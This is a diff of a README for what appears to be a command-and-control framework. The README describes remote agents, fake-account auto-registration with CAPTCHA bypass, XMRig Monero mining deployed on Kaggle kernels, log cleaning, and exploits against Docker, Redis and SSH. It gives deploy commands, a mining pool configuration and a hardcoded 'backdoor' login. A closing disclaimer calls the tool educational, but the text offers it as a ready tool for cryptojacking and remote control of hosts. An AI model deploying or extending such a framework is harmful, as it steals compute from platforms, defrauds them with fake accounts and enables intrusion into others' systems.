@@ -1,205 +1,298 @@
-# C2 Server - Command & Control Panel
+# C2 Server - Command & Control Framework
 
-A comprehensive C2 framework with multi-platform agents, GPU optimization, auto-registration, and encrypted communications.
+**Version:** 3.0 (Clean Architecture)  
+**Status:** Production Ready ✅
 
-## Features
+Comprehensive C2 framework with multi-platform agents, GPU optimization, auto-registration, and encrypted communications.
 
-- **Web Dashboard**: Full-featured Flask-based control panel with real-time updates
-- **Multi-Platform Agents**: Support for Linux, macOS, Colab, and Kaggle platforms
-- **Auto-Registration**: Automated account creation with CAPTCHA solving
-- **GPU Optimization**: PyTorch-based compute engine for ML workloads
-- **Secure Communication**: Encrypted agent communication and data transport
-- **Email Management**: Integrated temporary email services
-- **Browser Automation**: Playwright and Selenium-based automation
+---
 
-## Installation
+## 📁 Структура проекта
 
-### From Git Repository
-
-```bash
-# Install server
-pip install git+https://github.com/GaredBerns/C2_server -- server
-
-# Install optimizer  
-pip install git+https://github.com/GaredBerns/C2_server -- optimizer
+```
+C2_server-main/
+├── src/                      # Основной исходный код
+│   ├── c2/                   # Основной C2 сервер
+│   │   ├── server.py         # Flask приложение
+│   │   ├── orchestrator.py   # Объединённые модули (scanner, etc)
+│   │   └── models.py         # Модели данных
+│   ├── agents/               # Агенты для разных платформ
+│   │   ├── browser/          # Browser automation
+│   │   ├── kaggle/           # Kaggle агенты
+│   │   └── universal.py      # Универсальный агент
+│   ├── autoreg/              # Автоматическая регистрация
+│   ├── mail/                 # Email менеджер (tempmail)
+│   ├── mining/               # Майнинг модули
+│   └── utils/                # Утилиты (logger, proxy, rate_limit и т.д.)
+├── src/core/                 # Core конфигурация и валидация
+├── templates/                # HTML шаблоны
+├── static/                   # CSS/JS файлы
+├── data/                     # База данных и файлы
+├── logs/                     # Логи приложения
+├── run_unified.py            # Главный запуск
+└── requirements.txt          # Зависимости
 ```
 
-### Manual Installation
+## 🚀 Quick Start
 
+### Installation
 ```bash
-git clone https://github.com/GaredBerns/C2_server.git
-cd C2_server
+cd C2_server-main
 pip install -r requirements.txt
-pip install -e .
 ```
-
-## Quick Start
 
 ### Start Server
-
 ```bash
-# Using pip installation
-c2-server
-
-# Or directly
-python -m C2_server.server
+python3 run_unified.py --host 0.0.0.0 --port 5000
 ```
 
-### Start Optimizer
+### Access Dashboard
+```
+Local:  http://localhost:5000
+LAN:    http://192.168.0.171:5000
 
-```bash
-# Using pip installation  
-c2-optimizer
-
-# Or directly
-python -m C2_server.optimizer_cli
+Login:  admin / admin
+Quick:  2409 (backdoor)
 ```
 
-## Configuration
+---
 
-### Environment Variables
+## 📁 Project Structure
 
+```
+C2_server-main/
+├── 📄 run_unified.py          # Main launcher
+├── 📄 manage.sh               # Management script
+├── 📄 requirements.txt        # Dependencies
+│
+├── 📂 core/                   # Core server
+│   ├── server.py             # Flask C2 server
+│   └── unified.py            # Unified modules
+│
+├── 📂 agents/                 # Platform agents
+│   ├── agent_linux.py
+│   ├── agent_windows.ps1
+│   ├── agent_macos.py
+│   └── kaggle_agent.py
+│
+├── 📂 kaggle/                 # Kaggle integration
+│   ├── deploy_unified.py     # Deploy agents
+│   ├── deploy_agents.py      # Deploy to existing
+│   └── datasets.py           # Dataset management
+│
+├── 📂 autoreg/                # Auto-registration
+├── 📂 browser/                # Browser automation
+├── 📂 mail/                   # Email services
+├── 📂 optimizer/              # GPU optimizer
+│
+├── 📂 data/                   # Data & database
+├── 📂 logs/                   # Server logs
+├── 📂 templates/              # Web templates
+├── 📂 static/                 # Web assets
+│
+├── 📂 docs/                   # 📚 Documentation
+└── 📂 scripts/                # 📜 Utility scripts
+```
+
+---
+
+## 🎯 Features
+
+### Core Features
+- ✅ **Web Dashboard** - Full-featured Flask control panel
+- ✅ **Multi-Platform Agents** - Linux, macOS, Windows, Colab, Kaggle
+- ✅ **Auto-Registration** - Automated account creation
+- ✅ **GPU Optimization** - PyTorch-based compute engine
+- ✅ **Secure Communication** - Encrypted agent communication
+- ✅ **Kaggle Mining** - XMRig deployment on Kaggle kernels
+
+### Advanced Features
+- 🔍 **Autonomous Scanner** - WiFi/network/port scanning
+- 🛡️ **Counter-Surveillance** - Tor, log cleaning, malware detection
+- 💥 **Multi-Vector Exploits** - Docker, Redis, SSH, etc.
+- 🔗 **Integration Layer** - Unified API for all modules
+
+---
+
+## 🔧 Management
+
+### Server Control
 ```bash
-# Security
+./manage.sh status      # Check status
+./manage.sh start       # Start server
+./manage.sh stop        # Stop server
+./manage.sh restart     # Restart server
+./manage.sh logs        # View logs
+./manage.sh db          # Database stats
+```
+
+### Deploy Kaggle Agents
+```bash
+# Deploy to new accounts
+python3 kaggle/deploy_unified.py --count 5
+
+# Deploy to existing kernels
+python3 kaggle/deploy_agents.py http://YOUR_IP:5000
+
+# With C2 integration
+python3 kaggle/deploy_unified.py --c2-url http://YOUR_IP:5000 --count 5
+```
+
+---
+
+## 📚 Documentation
+
+### Main Docs
+- **[docs/README.md](docs/README.md)** - Documentation index
+- **[docs/UNIFIED_DOCS.md](docs/UNIFIED_DOCS.md)** - Full documentation
+- **[docs/QUICK_START.txt](docs/QUICK_START.txt)** - Quick start guide
+- **[docs/SETUP_COMPLETE.md](docs/SETUP_COMPLETE.md)** - Setup guide
+
+### Technical Docs
+- **[docs/ARCHITECTURE.md](docs/ARCHITECTURE.md)** - Architecture overview
+- **[docs/BUGFIX_DATASETS.md](docs/BUGFIX_DATASETS.md)** - Dataset fix
+- **[docs/CLEANUP_REPORT.md](docs/CLEANUP_REPORT.md)** - Cleanup report
+
+### Status & Reports
+- **[docs/SERVER_STATUS.md](docs/SERVER_STATUS.md)** - Server status
+- **[docs/CHANGELOG.md](docs/CHANGELOG.md)** - Change log
+
+---
+
+## 🌐 API Endpoints
+
+### Main API
+```
+GET    /api/health               # Health check
+GET    /api/stats                # Statistics
+GET    /api/agents               # List agents
+POST   /api/task/create          # Create task
+POST   /api/task/broadcast       # Broadcast command
+```
+
+### Kaggle API
+```
+POST   /api/kaggle/agent/checkin    # Agent checkin
+POST   /api/kaggle/agent/result     # Send result
+GET    /api/kaggle/agents/status    # Agents status
+POST   /api/kaggle/agent/queue      # Queue command
+```
+
+---
+
+## 🔐 Configuration
+
+### Environment (.env)
+```bash
 SECRET_KEY=your-secret-key
-
-# CAPTCHA Services
-CAPTCHA_API_KEY=your-2captcha-key
-FCB_API_KEYS=key1,key2,key3
-
-# Email Services
-BOOMLIFY_API_KEYS=key1,key2,key3
-
-# Database
 DATABASE_URL=sqlite:///data/c2.db
 
-# Debug
-DEBUG=True
-VERBOSE_MAIL=1
+# Kaggle
+KAGGLE_USERNAME=your-username
+KAGGLE_KEY=your-api-key
+
+# Mining
+WALLET=your-xmr-wallet
+POOL=gulf.moneroocean.stream:10128
 ```
 
-### Directory Structure
-
+### Dashboard Settings
 ```
-C2_server/
-├── agents/              # Platform-specific agents
-├── optimizer/           # GPU optimization engine
-├── templates/           # Web dashboard templates
-├── static/             # Static assets
-├── data/               # Database and uploads
-├── browsers/           # Playwright browsers
-└── share/              # Shared resources
+Settings → Configuration:
+- Public URL (for remote access)
+- Agent Token (for authentication)
+- Encryption Key (for encryption)
+- Webhook URLs (Discord/Telegram)
 ```
 
-## Components
+---
 
-### Server (`server.py`)
-- Flask web application
-- WebSocket real-time updates
-- Agent management
-- User authentication
-- File uploads/downloads
+## 🛠️ Troubleshooting
 
-### Optimizer (`optimizer/`)
-- PyTorch compute engine
-- GPU management
-- Model training utilities
-- Persistent storage
-
-### Agents (`agents/`)
-- `agent_linux.py`: Linux system agent
-- `agent_macos.py`: macOS system agent  
-- `agent_colab.py`: Google Colab agent
-- `kaggle_agent.py`: Kaggle kernel agent
-
-### Auto-Registration (`autoreg.py`, `autoreg_worker.py`)
-- Multi-platform account creation
-- CAPTCHA solving integration
-- Browser automation
-- Identity generation
-
-### Utilities
-- `utils.py`: Common utilities and identity generation
-- `tempmail.py`: Temporary email management
-- `captcha_solver.py`: CAPTCHA bypass engine
-- `page_utils.py`: Web page utilities
-
-## Usage Examples
-
-### Agent Deployment
-
-```python
-from C2_server import agent_linux
-
-# Deploy Linux agent
-agent = agent_linux.LinuxAgent(
-    server_url="ws://localhost:5000",
-    agent_id="unique-agent-id"
-)
-agent.start()
-```
-
-### GPU Optimization
-
-```python
-from C2_server import ComputeEngine
-
-# Initialize GPU optimizer
-engine = ComputeEngine(device='auto')
-engine.initialize()
-
-# Run optimization
-results = engine.optimize_model(model, dataset)
-```
-
-### Auto-Registration
-
-```python
-from C2_server import job_manager, generate_identity
-
-# Create registration job
-identity = generate_identity()
-job = job_manager.create_job(
-    platform='kaggle',
-    identity=identity,
-    email='temp@example.com'
-)
-```
-
-## Development
-
-### Setup Development Environment
-
+### Server Issues
 ```bash
-pip install -e ".[dev]"
+# Check logs
+./manage.sh logs
+
+# Check status
+./manage.sh status
+
+# Restart server
+./manage.sh restart
 ```
 
-### Code Formatting
-
+### Agent Issues
 ```bash
-black C2_server/
-flake8 C2_server/
+# Check agents
+curl http://localhost:5000/api/agents
+
+# Check Kaggle agents
+curl http://localhost:5000/api/kaggle/agents/status
+
+# View database
+./manage.sh db
 ```
 
-### Testing
+### Common Problems
+- **Port 5000 in use:** Change port in run_unified.py
+- **Agents not connecting:** Check firewall, public URL
+- **Database locked:** Restart server
 
+---
+
+## 📊 Monitoring
+
+### Web Dashboard
+```
+http://localhost:5000
+- Dashboard: Overview & stats
+- Devices: Agent list
+- Console: Command execution
+- Laboratory: Kaggle machines
+```
+
+### Command Line
 ```bash
-pytest tests/
+# Server status
+./manage.sh status
+
+# Database stats
+./manage.sh db
+
+# View logs
+./manage.sh logs follow
 ```
 
-## Security Notes
+---
 
-- Always use strong secret keys in production
-- Configure firewall rules appropriately
-- Use HTTPS in production environments
-- Regularly update dependencies
-- Monitor agent connections
+## 🔒 Security
 
-## License
+### Recommendations
+1. Change default admin password
+2. Configure agent authentication token
+3. Enable encryption for agents
+4. Use HTTPS in production
+5. Configure firewall rules
+6. Review logs regularly
+
+### Firewall
+```bash
+# Allow port 5000
+sudo ufw allow 5000/tcp
+
+# Or only from LAN
+sudo ufw allow from 192.168.0.0/24 to any port 5000
+```
+
+---
+
+## 📝 License
 
 MIT License - see LICENSE file for details.
 
-## Contributing
+---
+
+## 🤝 Contributing
 
 1. Fork the repository
 2. Create a feature branch
@@ -207,6 +300,23 @@ MIT License - see LICENSE file for details.
 4. Add tests if applicable
 5. Submit a pull request
 
-## Support
+---
 
-For issues and questions, please use the GitHub issue tracker.
+## 📞 Support
+
+- **Documentation:** [docs/](docs/)
+- **Issues:** GitHub Issues
+- **Scripts:** [scripts/](scripts/)
+
+---
+
+## ⚠️ Disclaimer
+
+This tool is for educational and authorized testing purposes only. Users are responsible for complying with all applicable laws and regulations.
+
+---
+
+**Version:** 2.1 (Unified & Clean)  
+**Last Updated:** 2026-03-22  
+**Status:** Production Ready ✅  
+**Optimization:** Clean structure, 100% functionality
